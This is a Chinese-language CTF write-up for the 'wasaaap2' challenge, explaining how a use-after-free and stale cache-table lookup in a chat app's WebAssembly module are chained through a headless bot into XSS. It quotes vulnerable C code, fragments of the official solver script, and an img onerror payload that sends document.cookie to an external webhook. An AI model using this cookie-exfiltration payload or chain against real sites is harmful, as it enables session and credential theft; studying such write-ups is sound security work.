# wasaaap2

## 题目简述

题目是一个前后端分离的聊天应用：`app.js` 提供 Express 接口，`/bot?visit=` 调起浏览器 bot；核心会话逻辑在 `static/module/module.js` 所在的 WebAssembly 模块（`module.c`）里。

官方 `admin/exploit/solver_local/solver_local.py` 直接构造消息序列并最终生成可访问 URL（`visit=<base64 payload>`）说明它本质上不是算法题，而是“WASM 堆对象管理 + 缓存查表漏洞 + 客户端渲染链”。最终收口是通过 bot 浏览器读取 `Flag` cookie；由于决定性原语来自 WASM 线性内存中的对象破坏，仍应归入 `pwn`，而不是按外层 Web 界面分类。

## 解题过程

### 关键观察

源码关键点来自 `module.c`：

- 每条消息有 `msg` + `cachetable` 两条路径，缓存表按开放寻址存 `cached_msg{data,msg,msg_id}`；
- `deleteMsg` 只 `size--` 和 `free`，`getFromCacheTable` 在查找时不检查 `allmsg[idx]` 是否为空；
- `populateMsgHTML` 在 `is_text && cached` 分支里直接信任缓存项并索引长度数组；
- 这几处组合意味着删改后可触发脏缓存或越界访问，进而在结构体数组与缓存条目之间产生可写/可读错配。

```c
int getFromCacheTable (cachetable *table,int msg_id) {
    int idx = getIdx(msg_id);
    cached_msg **allmsg = table->msgs;

    while(true)  {
        if ((allmsg[idx])->msg_id == msg_id) {
            return idx;
        }
        idx = ( idx + 1 ) % CACHE_TABLE_SIZE;
        ...
        if (count > CACHE_TABLE_SIZE) break;
    }
    return INVALID_ENTRY;
}
```

`populateMsgHTML` 和 `renderHtml` 又提供了 HTML 路径与渲染路径切换：

```c
char *safe_content = sanitizeWithJs(s.mess[i].msg_data,...);
char *safeHTML = toSafeHTML(safe_content,...);
callback(safeHTML,...,i);
```

官方 bot 侧会在新标签中访问题目域并设置 `Flag` cookie（`bot.js`），所以最终只要让前端可执行读取 cookie 的 payload 运行即可。

### 利用链

官方脚本是按“序列化消息行为树”执行的：

1. **构造布局与缓存关系**

```python
for i in range(10): to_free.append(addmsg("a"*8,0x0))
to_free.append(addmsg("a"*100,0x0))
...
x = addmsg("A", 0x0)   # 锚点 message
...
```

2. **在 `<-cache table>` 前后制造可控对象错配**

脚本在固定索引处放一条 HTML 片段（含 `onerror`）作为可触发内容：

```python
"<div id='</xmp><img src=x onerror=window.open(\"https://webhook.../?flag=\"+document.cookie)>'></div>"
```

3. **通过 UAF/缓存污染形成任意读写窗口**

脚本不断 `editmsg` 已有索引（如 `18`, `31`），先后改写 `edit` 后 `delmsg(31)`，再追加 `y=addmsg("aaa")`，通过 `x`,`y` 的关联让 `msg_id` 与缓存入口产生偏移映射（注释已明确这是“arb-read-write”阶段）。

4. **拼 payload 并触发 bot 渲染路径**

最终把动作序列 JSON 压缩为 base64 URL 片段，喂给 `/bot`：

```python
payloadStr = json.dumps(json_payload, separators=(',', ':'))
b64e_payload = base64.b64encode(payloadStr.encode('utf-8')).decode('utf-8')
```

`bot.js` 在无沙箱的 Puppeteer 中打开该 URL，若 exploit 生效则 `onerror` 回调会请求外部 webhook 并带出 `document.cookie`。

### 验证

官方脚本输出了两类关键数据，均可在本地复核：

- `payloadStr`：包含了最终 add/delete/edit/sync 操作序列；
- `BASE64 PAYLOAD`：进入 `visit=` 参数时可重复注入。

配合 `Flag` cookie 注入（`bot.js`）、`app.js` 路由、`module.c` 的渲染/缓存缺陷，可闭环验证为浏览器侧执行 + 污染后的信息泄露链。

## 方法总结

- 核心技巧：WASM 程序内部结构体/缓存表失配（尤其 `getFromCacheTable` 的空指针/边界前置校验缺失）+ 消息数组索引移动，使缓存入口被写到非法对象，进而借页面渲染触发 XSS 回传。
- 识别信号：消息系统里既有 `cachetable` 的哈希桶/位图，也有“删除后不清理 + open addressing”时的 stale pointer，则要首先判断是否为内存安全问题，而非纯模板注入。
- 复用要点：先抓到 `msgs`、`cachetable`、`delete`、`edit` 的交互顺序，再寻找 bot/模板入口；多数此类题能否得手取决于“能否稳定触发非预期的缓存查表路径”。
- 最终分类：`Pwn`（WASM 内存漏洞，最终链路通过前端执行上下文取 cookie）。
